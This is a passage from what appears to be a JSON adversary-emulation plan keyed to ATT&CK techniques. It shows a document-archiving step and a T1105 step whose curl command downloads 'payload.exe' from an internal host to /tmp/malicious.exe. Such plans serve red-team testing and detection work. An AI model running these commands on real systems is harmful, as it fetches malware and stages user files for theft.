      "target": "target.primary",
      "parameters": {
        "source_dir": "/home/user/docs",
        "archive_path": "/tmp/archives/documents.zip",
        "date_filter": "2021-01-01"
      }
    },
    {
      "technique_id": "T1105",
      "mechanism": "curl-download",
      "command": "curl -o /tmp/malicious.exe http://10.0.0.5/payload.exe",
      "target": "target.primary",
      "parameters": {
        "url": "http://10.0.0.5/payload.exe",
        "output_path": "/tmp/malicious.exe"
